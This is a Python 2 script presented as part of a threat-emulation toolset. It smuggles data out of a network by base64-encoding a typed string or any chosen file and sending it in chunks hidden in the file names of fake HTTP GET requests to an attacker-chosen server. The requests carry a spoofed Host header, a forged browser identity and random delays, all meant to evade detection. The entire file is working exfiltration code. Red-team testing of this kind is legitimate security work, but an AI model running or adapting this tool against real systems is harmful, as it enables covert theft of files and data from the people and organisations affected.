

#!/usr/bin/env python
import socket
import sys
import os
import random
import base64
import time
from time import gmtime, strftime


print "============================================V2.0===================================================="
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~GET some (HTTP exfill)~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
print "~~~~~~~~~~~~~~~~~~~~~~~part of the Threat Emulation Evaluation Toolset (TEET)~~~~~~~~~~~~~~~~~~~~~~~"
print "===========================================penetrate.io============================================="

def sender (server,port,fakehost,instring,timedelay,uid):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    # fragmentation for DATA fields > of 54 bytes
    x = len(instring) / 128
    y = len(instring) % 128

    seq_id = 0
    str_seq_id=str(seq_id)

    header = "GET /cv/ae/us/rss"
    ext = ".xml"
    header2 = " HTTP/1.1\r\nHost: "
    header3 = "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Google Chrome (Windows x86)"
    header4 = "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://www.google.com/\r\n"


  #send initial packet with UID
    senserverring = header + "/" + "init/" + uid + ext + header2 + fakehost + header3 + header4 + "\r"
    s.send(senserverring)

  #exfill data in 128 byte chunks in filename
    for i in range(1,x+2):
        seq_id = seq_id + 1
        str_seq_id=str(seq_id)
        str_send = instring[128*(i-1): 128*i]
        senserverring = header + "/" + str_seq_id + "/" + str_send + ext + header2 + fakehost + header3 + header4 + "\r"
        s.send(senserverring)

        print "[*] GET packet number: %s sent" %(seq_id)
        timedelay = random.randrange(1, 30, 1)
        time.sleep(timedelay)

  # send remaining bytes
    seq_id = seq_id + 1
    str_seq_id=str(seq_id)
    str_send = instring[128*i:128*i+ y]
    senserverring = header + "/" + str_seq_id + "/" + str_send + "fin" + ext + header2 + fakehost + header3 + header4 + "\r"
    s.send(senserverring)

    s.close()


def main ():

    server = raw_input("IP to send HTTP GET Packet: ")
    port = raw_input("Port to send Packet: ")
    port = int(port)

    timedelay = raw_input("Time between packets (in seconds or (R) for random): ")
    if timedelay == "R":
        timedelay = random.randrange(1, 30, 1)
    else:
        timedelay = float(timedelay)

    fakehost = raw_input("Enter the fake host: ")



    inputchoice = raw_input("Smuggle out data from stdin(0) or read in a file(1)? (0 or 1): ")

    if inputchoice == "0":
        instring = raw_input("Enter your string: ")
        instring = base64.b64encode(instring)
        print "===================================================================================================="
        print "Base64 encoded version being chunked up and sent in the filename of the GET request(s).."
        print instring
        print "===================================================================================================="
        uidtimestamp = strftime("%Y%m%d%H%M", gmtime())
        lengthstr = len(instring)
        lengthstr = str(lengthstr)
        uid = "TEET" + "-" + uidtimestamp + "-" + lengthstr
        sender (server,port,fakehost,instring,timedelay,uid)

    elif inputchoice == "1":
        filename = raw_input("Enter the filename to read in: ")
        instring = ""
        filez = open(filename,"r");

        for line in filez:
          #print "reading in %s ..." %(line)
            instring += line


        print "Reading in the following text from file.."
        print "===================================================================================================="
        print instring
        filez.close()
        instring = base64.b64encode(instring)
        print "===================================================================================================="
        print "                                                                                                    "
        print "Base64 encoded version being chunked up and sent in the filename of the GET request.."
        print instring
        print "===================================================================================================="
        uidtimestamp = strftime("%Y%m%d%H%M", gmtime())
        lengthstr = len(instring)
        lengthstr = str(lengthstr)
        uid = "TEET" + "-" + uidtimestamp + "-" + lengthstr
        sender (server,port,fakehost,instring,timedelay,uid)




    print "Data is being smuggled out in the filename of the HTTP GET...  <base64codedtext>.xml"

    #call on the sender function to chunk up the data and transmit it

    #write to the log file for comparing later on
    port=str(port)
    record = "HTTP GET: " + "server:" + server + ":" + port + " UID:" + uid + "\r"
    print "Writing to the log file: %s" %(record)
    logfile = open("log/log.txt","a+b")
    logfile.write(record)
    logfile.close()


main()
